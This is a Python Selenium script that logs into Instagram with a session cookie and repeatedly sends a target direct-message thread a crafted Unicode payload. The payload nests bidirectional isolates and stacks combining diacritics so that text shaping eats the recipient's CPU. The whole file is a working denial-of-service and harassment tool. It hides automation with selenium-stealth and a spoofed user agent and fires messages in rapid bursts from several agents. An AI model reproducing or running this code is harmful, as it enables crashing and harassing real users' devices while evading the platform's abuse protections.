# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (STACK-OVERFLOW V67)
# 📅 STATUS: HARFBUZZ-RECURSION-MAX | 4-AGENT TOTAL | AWS-CPU-KILL

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.1, 0.3)    # 🔥 Rapid Fire
REST_AFTER_STRIKES = 180   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_stack_overflow_payload():
    """Generates a payload targeting HarfBuzz recursion and BiDi stack limits."""
    u_id = random.randint(1000, 9999)
    
    # \u2066 = LRI | \u2067 = RLI | \u2068 = FSI | \u2069 = PDI
    # \u0300-\u036F = Combining marks (Diacritics)
    lri, rli, fsi, pdi = "\u2066", "\u2067", "\u2068", "\u2069"
    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) # 80 stacked marks
    glue = "\u2060" # Word Joiner
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HARD_LOCK:{u_id}]"
    
    body = []
    # 400 lines of 'Recursive Layout Thrashing'
    for i in range(400):
        # We nest isolates 8 levels deep. 
        # Every level flip-flops the text direction, forcing the CPU to 
        # re-calculate the entire 'shaping' path for every character.
        nest = f"{lri}{rli}{fsi}" * 3 # 9 layers deep
        pop = f"{pdi}" * 9
        
        # We combine 'PRAVEER' with 80 diacritics and the directional nest
        line = f"{nest}P{marks}R{marks}A{marks}V{marks}EER{pop}🌙{i}{glue*6}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Direct DOM injection that clears the input state before firing."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // Clear any potential 'Typing' hang from previous failures
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                // Inject the Nuclear Payload
                document.execCommand('insertText', false, arguments[0]);
                // Sync Internal React State
                box.dispatchEvent(new Event('input', { bubbles: true }));
                // Fire Trusted Enter Dispatch
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_stack_overflow_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Nuclear-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 50 == 0:
                        driver.refresh()
                        time.sleep(10)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
